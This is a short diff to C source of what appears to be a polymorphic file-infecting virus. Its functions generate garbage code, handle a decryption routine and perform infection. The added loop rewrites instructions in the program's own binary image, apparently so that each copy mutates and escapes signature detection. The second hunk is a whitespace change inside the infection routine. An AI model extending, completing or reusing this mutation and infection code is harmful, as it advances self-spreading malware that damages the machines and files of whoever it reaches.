@@ -65,6 +65,12 @@ void change_garbage_code(){
 		generate_garb(((unsigned char *)(&bin_start)) + garbage_table[i].off, garbage_table[i].len, prev);
 		prev = ((unsigned char *)(&bin_start)) + garbage_table[i].off + garbage_table[i].len;
 	}
+
+	for (size_t i = 0 ; i < modified_table_len; i++){
+		debug_ext("search -> \n");
+		int xx = edit_ins(((unsigned char *)(&bin_start)) + modified_table[i].off, modified_table[i].len - 5, 5);
+			debug_ext("for ", i, " >> ",xx," \n");
+	}
 	debug_ext("\n");
 }
 
@@ -104,7 +110,7 @@ void do_infection(){
 		size_t decrypt_routine_off = ((size_t)&DECRYPT_ROUTINE) - ((size_t)&bin_start);
 		size_t data_off = ((size_t)&data) - ((size_t)&bin_start);
 		size_t dataearly_off = ((size_t)&dataearly) - ((size_t)&bin_start);
-		
+
 		size_t infectpush_off = ((size_t)&_infect_push) - ((size_t)&bin_start);
 		size_t infectpop_off = ((size_t)&_infect_pop) - ((size_t)&bin_start);
 
